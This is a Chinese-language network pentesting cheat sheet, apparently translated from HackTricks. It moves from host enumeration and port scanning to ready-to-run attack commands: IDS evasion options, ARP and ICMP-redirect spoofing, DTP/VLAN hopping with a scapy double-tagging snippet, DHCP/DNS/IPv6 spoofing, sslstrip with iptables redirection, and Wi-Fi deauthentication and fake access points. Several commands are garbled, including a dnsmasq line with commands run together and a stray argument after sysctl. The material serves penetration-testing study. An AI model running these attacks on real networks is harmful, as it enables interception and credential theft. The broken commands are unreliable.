---
profileName: redcamellia
postId: "32"
postType: post
categories:
  - 2
---
# 枚举/嗅探/前期
~~*对于国内环境，枚举的前期会使用[[PreRecon]]*~~
## 从外部枚举主机
这将是一个简短的部分，介绍如何查找从 Internet 响应的 IP。 在这种情况下，有一些 IP 范围（甚至可能是几个范围），只是为了找到哪些 IP 正在响应。
### ICMP
```sh
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### 枚举TCP端口
发现所有类型的ICMP数据包都被过滤是很常见的。然后，要检查主机是否已启动，所能做的就是尝试查找打开的端口。每个主机有 65535 个端口，因此，如果有一个“大”范围，则无法测试每个主机的每个端口是否打开，这将花费太多时间。需要使用快速端口扫描仪（ masscan ）和更多使用的端口列表：
```sh
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
也可以使用 `nmap` 执行此步骤，但它速度较慢，并且 `nmap` 无法识别有些主机。
### 枚举HTTP端口
专门扫HTTP服务时：
```sh
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### 枚举UDP端口
还可以尝试检查某些 UDP 端口是否打开，以决定是否应该更加关注某个主机。 由于 UDP 服务通常不会对常规空 UDP 探测数据包做出任何数据响应，因此很难判断端口是否被过滤或打开。决定这一点的最简单方法是发送与正在运行的服务相关的数据包，由于不知道哪个服务正在运行，因此根据端口号尝试最有可能的：
```sh
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
nmap 将测试 /24 范围内每个主机中的前 1000 个 UDP 端口，但即使仅此也需要 >20 分钟。如果需要最快的结果，可以使用 udp-proto-scanner ： `./udp-proto-scanner.pl 199.66.11.53/24` 这会将这些 UDP 探测器发送到其预期端口（对于 /24 范围，这只需要 1 分钟）：
```UDP服务探针
DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp。
```
### 用SCTP发现端口
```sh
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## 从内部枚举主机
### 被动枚举
可以使用以下工具被动地发现已连接网络中的主机：
```sh
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动枚举
注意，[[#从外部枚举主机]]中的任何手段也可以在此应用，但是因为与目的主机处于同一网络，可以执行更多的操作。
```sh
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
#### 主动ICMP
- 如果 ping 子网广播地址，则 ping 应到达每个主机，它们可以响应： `ping -b 10.10.5.255`
- 通过ping网络广播地址，甚至可以在其他子网中找到主机： `ping -b 255.255.255.255`
- 使用 `nmap` 的 `-PE` 、 `-PP` 、 `-PM` 标志分别执行主机发现发送 ICMPv4 回显、时间戳和子网掩码请求：`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`
#### Wake On Lan
局域网唤醒用于通过网络消息打开计算机。用于打开计算机的魔术数据包只是一个提供 MAC Dst 的数据包，然后在同一 paket 中重复 16 次。 然后，这种数据包通常以以太网0x0842或UDP数据包的形式发送到端口9。 如果未提供 \[MAC]，则数据包将发送到广播以太网（广播 MAC 将是重复的 MAC）。
```
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机
一旦枚举了要深入扫描的所有IP（外部或内部），就可以执行不同的操作。
### TCP扫描
- **Open** port: _SYN --> SYN/ACK --> RST_  
    开放端口：SYN --> SYN/ACK --> RST
- **Closed** port: _SYN --> RST/ACK_  
    关闭端口：SYN --> RST/ACK
- **Filtered** port: _SYN --> \[NO RESPONSE]_  
    过滤端口：SYN --> \[无响应]
- **Filtered** port: _SYN --> ICMP message_  
    过滤端口：SYN --> ICMP 消息
```
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP扫描
扫描 UDP 端口有 2 个选项：
- 发送 UDP 数据包并检查响应 ICMP 是否无法访问（在一些情况下，ICMP 将被过滤，因此在端口关闭或打开的情况下，不会收到任何信息）。
- 发送格式化的数据报以从服务（例如，DNS、DHCP、TFTP 等，如 nmap-payloads 中列出）引发响应。如果收到响应，则端口处于打开状态。
**Nmap 将使用“-sV”混合这两个选项（UDP 扫描非常慢），但请注意 UDP 扫描比 TCP 扫描要慢：
```
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP扫描
SCTP（流控制传输协议）旨在与 TCP（传输控制协议）和 UDP（用户数据报协议）一起使用。其主要目的是促进通过 IP 网络传输电话数据，反映了信令系统 7 （SS7） 中的许多可靠性特性。 SCTP 是 SIGTRAN 协议系列的核心组件，旨在通过 IP 网络传输 SS7 信号。

对 SCTP 的支持由各种操作系统提供，例如 IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS 和 VxWorks，表明其在电信和网络领域的广泛接受和实用性。

nmap 提供两种不同的 SCTP 扫描：-sY 和 -sZ
```
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 规避
#### **操纵TTL**

发送一些具有足够 TTL 的数据包以到达 IDS/IPS，但不足以到达最终系统。然后，发送另一个具有与其他数据包相同序列的数据包，以便 IPS/IDS 会认为它们是重复的并且不会检查它们，但实际上它们携带了恶意内容。

**Nmap 选项： `--ttlvalue <value>`

#### 避免签名

Just add garbage data to the packets so the IPS/IDS signature is avoided.  
只需将垃圾数据添加到数据包中，即可避免 IPS/IDS 签名。

**Nmap option:** `--data-length 25` Nmap 选项： `--data-length 25`

#### 分段数据包

只需对数据包进行分段并发送即可。如果 IDS/IPS 无法重新组装它们，它们将到达最终主机。

**Nmap option:** `-f` Nmap 选项： `-f`

#### **Invalid** _**checksum**_ 校验和无效

出于性能原因，传感器(ID/PS)通常不计算校验和。因此，攻击者可以发送一个数据包，该数据包将由传感器解释，但被最终主机拒绝。 例：

发送带有 RST 标志和无效校验和的数据包，因此，IPS/IDS 可能会认为此数据包将关闭连接，但最终主机将丢弃该数据包，因为校验和无效。

#### **不常见的 IP 和 TCP 选项**

传感器可能会忽略在 IP 和 TCP 标头中设置了某些标志和选项的数据包，而目标主机在收到数据包时接受数据包。

####  **重叠数据包**

对数据包进行分段时，数据包之间可能存在某种重叠（数据包 2 的前 8 个字节可能与数据包 1 的最后 8 个字节重叠，数据包 2 的最后 8 个字节与数据包 3 的前 8 个字节重叠）。然后，如果 IDS/IPS 以与最终主机不同的方式重新组合它们，则将解释不同的数据包。 或者，可能会有 2 个具有相同偏移量的数据包，主机必须决定采用哪一个。

- **BSD**：它优先选择偏移量较小的数据包。对于具有相同偏移量的数据包，它将选择第一个数据包。
- **Linux**：与 BSD 类似，但它更喜欢具有相同偏移量的最后一个数据包。
- **第一个** （Windows）：第一个出现的值留下。
- **最后一个** （cisco）：最后一个值留下。
### Nmap
见[[NMAP]].
### 揭露内部 IP 地址

配置错误的路由器、防火墙和网络设备有时会使用非公网IP响应网络探测。 tcpdump 可用于识别测试期间从专用地址接收的数据包。具体来说，在 Kali Linux 上，数据包可以在 eth2 接口上捕获，该接口可从公共 Internet 访问。请务必注意，如果您的设置位于 NAT 或防火墙后面，则此类数据包可能会被过滤掉。
```
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## 嗅探
嗅探 您可以通过查看捕获的帧和数据包来了解 IP 范围、子网大小、MAC 地址和主机名的详细信息。如果网络配置错误或在压力下切换结构，攻击者可以通过被动网络嗅探捕获敏感材料。

如果交换机配置正确，您将只能看到发往 MAC 地址的广播帧和材料。
### TCPDump
```
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
还可以通过 SSH 会话从远程机器捕获数据包，并使用 Wireshark 作为 GUI 实时捕获数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark 
无需多言.[[WireShark]]
### 捕获凭据
可以使用 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 等工具来解析来自 pcap 或实时接口的凭据。
## LAN attacks 局域网攻击

### ARP 欺骗
ARP 欺骗包括发送无偿的 ARPResponses 以指示机器的 IP 具有我们设备的 MAC。然后，受害者将更改 ARP 表，并在每次想要联系被欺骗的 IP 时联系我们的机器。
#### **Bettercap**
```
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **Arpspoof**
```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC 泛洪 - CAM 溢出

溢出交换机的 CAM 表，发送大量具有不同源 mac 地址的数据包。当 CAM 表已满时，交换机开始像集线器一样运行（广播所有流量）。
```
macof -i <interface>
```
在现代交换机中，此漏洞已修复。

### 802.1Q VLAN / DTP 攻击

#### Dynamic Trunking 动态中继
动态中继协议 （DTP） 设计为链路层协议，以促进自动中继系统，允许交换机自动选择中继模式（中继）或非中继模式的端口。DTP 的部署通常被视为网络设计欠佳的迹象，这凸显了仅在必要时手动配置中继并确保正确文档的重要性。

默认情况下，交换机端口设置为在动态自动模式下运行，这意味着如果相邻交换机提示，它们已准备好启动中继。当渗透测试者或攻击者连接到交换机并发送 DTP 理想帧，迫使端口进入中继模式时，就会出现安全问题。此操作使攻击者能够通过 STP 帧分析枚举 VLAN，并通过设置虚拟接口来规避 VLAN 分段。
默认情况下，攻击者可以利用许多交换机中存在 DTP 来模拟交换机的行为，从而访问所有 VLAN 上的流量。脚本 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 用于监控接口，显示交换机是处于默认模式、中继模式、动态模式、自动模式还是访问模式，后者是唯一不受 VLAN 跳跃攻击影响的配置。此工具评估交换机的漏洞状态。

如果发现网络漏洞，可以使用 Yersinia 工具通过 DTP 协议“启用中继”，从而可以观察来自所有 VLAN 的数据包。
```
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FHFo4KympSBlYmczt3NGa%252Fimage.png%3Falt=media%26token=49ed09d2-b172-4f51-93ed-e2ddec01a085&width=768&dpr=4&quality=100&sign=4e56216fe93a121bb97e57d11d712785c1ad2914af57c1509393e04b17fbb551)

要枚举 VLAN，还可以使用脚本  [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) 生成 DTP Desirable 帧。在任何情况下都不要中断脚本。它每三秒注入一次 DTP Desirable。 交换机上动态创建的中继信道仅存活 5 分钟。五分钟后，信息块就寄。
```
sudo python3 DTPHijacking.py --interface eth0
```

我想指出的是，Access/Desirable （0x03） 表示 DTP 帧属于 Desirable 类型，它告诉端口切换到 Trunk 模式。802.1Q/802.1Q （0xa5） 表示 802.1Q 封装类型。

通过分析 STP 帧，我们了解了 VLAN 30 和 VLAN 60 的存在。

![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FMUXprxKCyCa7thNk18za%252Fimage.png%3Falt=media%26token=821ee5be-decd-4c2b-97e8-2bbf93d1a88d&width=768&dpr=4&quality=100&sign=f32d30015b5d8eb5e317a3e4d4297c705ff5034c926ff02f366c112a8eb1e662)

#### Attacking specific VLANs 攻击特定 VLAN

知道 VLAN ID 和 IP 值后，您可以配置虚拟接口来攻击特定 VLAN。 如果 DHCP 不可用，则使用 ifconfig 设置静态 IP 地址。
```sh
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```sh
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```sh
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### Automatic VLAN Hopper 自动 VLAN 漏斗

所讨论的动态中继攻击和创建虚拟接口以发现其他 VLAN 内的主机由以下工具自动执行： [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)
#### Double Tagging 双重标记

如果攻击者知道受害主机的MAC、IP和VLAN ID的值，他可以尝试使用其指定的VLAN和受害主机的VLAN对帧进行双重标记，并发送数据包。由于受害者无法与攻击者重新连接，因此攻击者的最佳选择是通过 UDP 与可以执行一些有趣操作（如 SNMP）的协议进行通信。

攻击者的另一种选择是启动TCP端口扫描，欺骗由攻击者控制并由受害者访问的IP（可能通过互联网）。然后，如果攻击者从受害者那里收到一些数据包，攻击者可以嗅探他拥有的第二台主机。

![](https://book.hacktricks.xyz/~gitbook/image?url=https:%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FHHYuR9d580W7O081ip6n%252Fimage.png%3Falt=media%26token=b293aa52-b32c-407c-a5fb-a6cde8cca7ad&width=768&dpr=4&quality=100&sign=a560fb3c83b695c1bd6ec08fce46a9e073f4cd8d957084b7af2dacb30a7f889d)

要执行此攻击，您可以使用 scapy： `pip install scapy`
```
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### Lateral VLAN Segmentation Bypass
如果您有权访问直接连接到的交换机，则可以绕过网络内的 VLAN 分段。只需将端口切换到中继模式（也称为中继），使用目标 VLAN 的 ID 创建虚拟接口，然后配置 IP 地址即可。您可以尝试动态请求地址 （DHCP），也可以静态配置它。这取决于具体情况。

[Lateral VLAN Segmentation Bypass](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/lateral-vlan-segmentation-bypass)

#### Layer 3 Private VLAN Bypass 第 3 层专用 VLAN 旁路

在某些环境（如访客无线网络）中，实施了端口隔离（也称为专用 VLAN）设置，以防止连接到无线接入点的客户端直接相互通信。但是，已经确定了一种可以规避这些隔离措施的技术。此技术利用缺少网络 ACL 或其配置不当，使 IP 数据包能够通过路由器路由到同一网络上的另一个客户端。

攻击是通过创建一个数据包来执行的，该数据包带有目标客户端的 IP 地址，但具有路由器的 MAC 地址。这会导致路由器错误地将数据包转发到目标客户端。此方法类似于双重标记攻击中使用的方法，在双重标记攻击中，控制受害者可访问的主机的能力用于利用安全漏洞。

**Key Steps of the Attack: 攻击的关键步骤：**

1. **Crafting a Packet:** A packet is specially crafted to include the target client's IP address but with the router's MAC address.  
    制作数据包：数据包经过特殊设计，包含目标客户端的 IP 地址，但包含路由器的 MAC 地址。
    
2. **Exploiting Router Behavior:** The crafted packet is sent up to the router, which, due to the configuration, redirects the packet to the target client, bypassing the isolation provided by private VLAN settings.  
    利用路由器行为：构建的数据包被发送到路由器，由于配置的原因，路由器会将数据包重定向到目标客户端，绕过专用 VLAN 设置提供的隔离。
    


在这次攻击中，交换机的 CPU 和 CDP 邻居表负担沉重，由于资源消耗过多，导致通常所说的“网络瘫痪”。
## **嗅探诱骗**
攻击者配置网络新成员的所有网络参数（GW、IP、DNS），发送虚假的DHCP响应。
```
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP 欺骗

查看[上一节]([[枚举(Enumeratiton)#ARP 欺骗]])。
### ICMP重定向
ICMP 重定向包括发送 ICMP 数据包类型 1 代码 5，指示攻击者是访问 IP 的最佳方式。然后，当受害者想要联系 IP 时，它会通过攻击者发送数据包。
```
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```

### DNS Spoofing DNS 欺骗
攻击者将解析受害者请求的部分（或全部）域。

```
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

使用 dnsmasq 配置自己的 DNS

```
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```

###  本地网关

通常存在通往系统和网络的多条路由。在本地网络中构建 MAC 地址列表后，使用 gateway-finder.py 来标识支持 IPv4 转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/) 
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```

### 欺骗 LLMNR、NBT-NS 和 mDNS

对于 DNS 查找不成功时的本地主机解析，Microsoft 系统依赖于链路本地多播名称解析 （LLMNR） 和 NetBIOS 名称服务 （NBT-NS）。同样，Apple Bonjour 和 Linux 零配置实现利用多播 DNS （mDNS） 来发现网络中的系统。由于这些协议的未经身份验证的性质以及它们在 UDP 广播消息上的操作，它们可能被旨在将用户重定向到恶意服务的攻击者利用。

You can impersonate services that are searched by hosts using Responder to send fake responses. Read here more information about [how to Impersonate services with Responder](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks).  
您可以使用 Responder 模拟主机搜索的服务来发送虚假响应。 在[此处](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)阅读有关如何使用 Responder 模拟服务的详细信息。

### Spoofing WPAD 欺骗 WPAD

浏览器通常使用 Web 代理自动发现 （WPAD） 协议来自动获取代理设置。这涉及从服务器获取配置详细信息，特别是通过“http://wpad.example.org/wpad.dat”等 URL。客户端可以通过各种机制发现此服务器：

- 通过 DHCP，通过使用特殊代码 252 条目来促进发现。
- 通过 DNS，这涉及在本地域中搜索标记为 wpad 的主机名。
- 通过 Microsoft LLMNR 和 NBT-NS，它们是在 DNS 查找不成功的情况下使用的回退机制。
工具 Responder 通过充当恶意 WPAD 服务器来利用此协议。它使用 DHCP、DNS、LLMNR 和 NBT-NS 来误导客户端连接到它。要更深入地了解如何使用 Responder 模拟服务，请查看 此 。

### 欺骗 SSDP 和 UPnP 设备

你可以在网络中提供不同的服务，以尝试诱骗用户输入一些纯文本凭据。 有关此攻击的详细信息 [欺骗 SSDP 和 UPnP 设备](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices)。

### IPv6 Neighbor Spoofing IPv6 邻居欺骗

这种攻击与 ARP 欺骗非常相似，但在 IPv6 世界中。你可以让受害者认为GW的IPv6有攻击者的MAC。
```
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```

### IPv6 路由器通告欺骗/泛洪

默认情况下，某些操作系统会根据网络中发送的 RA 数据包配置网关。要将攻击者声明为 IPv6 路由器，您可以使用：

```
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```

### IPv6 DHCP spoofing IPv6 DHCP 欺骗
默认情况下，某些操作系统会尝试配置读取网络中 DHCPv6 数据包的 DNS。然后，攻击者可以发送 DHCPv6 数据包以将自己配置为 DNS。DHCP 还向受害者提供 IPv6。
```
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```

### HTTP (fake page and JS code injection)  HTTP（假页面和JS代码注入）

## Internet Attacks 互联网攻击

### sslStrip

基本上，这种攻击的作用是，以防用户尝试访问重定向到HTTPS版本的HTTP页面。 sslStrip 将保持与客户端的 HTTP 连接以及与服务器的 HTTPS 连接，因此它无法以纯文本形式嗅探连接。
```
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```

More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).  
### sslStrip+ and dns2proxy for bypassing HSTS  
sslStrip+ 和 dns2proxy 用于绕过 HSTS

sslStrip+ 和 dns2proxy 对 sslStrip 的区别在于，它们会重定向例如 www.facebook.com 到 wwww.facebook.com（注意额外的“w”），并将此域的地址设置为攻击者 IP。这样，客户端将连接到 wwww.facebook.com（攻击者），但在幕后 sslstrip+ 将通过 https 与 www.facebook.com 保持真正的连接。

此技术的目标是避免 HSTS，因为 wwww.facebook.com 不会保存在浏览器的缓存中，因此浏览器将被欺骗以 HTTP 格式执行 facebook 身份验证。 请注意，为了执行此攻击，受害者必须尝试最初访问 [http://www.faceook.com](http://www.faceook.com/) 而不是 https。这可以通过修改 http 页面中的链接来完成。

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).  
更多信息 这里 ， 这里 和 这里 .

**sslStrip 或 sslStrip+ 没有;不再工作了。这是因为浏览器中预先保存了HSTS规则，因此即使这是用户第一次访问“重要”域，他也会通过HTTPS访问它。另外，请注意，预保存的规则和其他生成的规则可以使用标志 `**includeSubdomains**` ，因此之前的 wwww.facebook.com 示例将不再起作用，因为 facebook.com 将 HSTS 与 `**includeSubdomains**` 一起使用。

### TCP 侦听端口
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```

### TCP + SSL 侦听端口

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

#### 使用证书侦听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```

#### 使用证书侦听并重定向到主机
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

有时，如果客户端检查 CA 是否有效，则可以提供由 CA 签名的其他主机名的证书。 另一个有趣的测试是提供所请求主机名但自签名的证书。

其他要测试的事项是尝试使用有效证书对证书进行签名，该证书不是有效的 CA。或者要使用有效的公钥，强制使用一种算法作为diffie hellman（一种不需要用真正的私钥解密任何东西的算法），当客户端请求对真正的私钥（如哈希）进行探测时，发送一个假探测，并期望客户端不会检查这一点。

### Bettercap
```
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events 
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```

### Active Discovery Notes

请注意，当 UDP 数据包发送到没有请求端口的设备时，会发送 ICMP（端口无法访问）。

### ARP discover ARP 发现**

ARP packets are used to discover wich IPs are being used inside the network. The PC has to send a request for each possible IP address and only the ones that are being used will respond.  
ARP 数据包用于发现网络内部正在使用的 IP。PC 必须为每个可能的 IP 地址发送请求，并且只有正在使用的 IP 地址才会响应。

### mDNS（组播DNS）**

Bettercap 发送一个 MDNS 请求（每 X 毫秒）请求 _services_.dns-sd._udp.local，看到此 paket 的机器通常会响应此请求。然后，它只搜索应答“服务”的机器。

**Tools 工具**
- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder 
### **NBNS (NetBios Name Server) NBNS（NetBios 名称服务器）**
Bettercap 向端口 137/UDP 广播数据包，要求名称为"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"

### SSDP (Simple Service Discovery Protocol)  
SSDP（简单服务发现协议）**
Bettercap 广播 SSDP 数据包搜索所有类型的服务（UDP 端口 1900）。

### WSD (Web Service Discovery) WSD（Web 服务发现）**
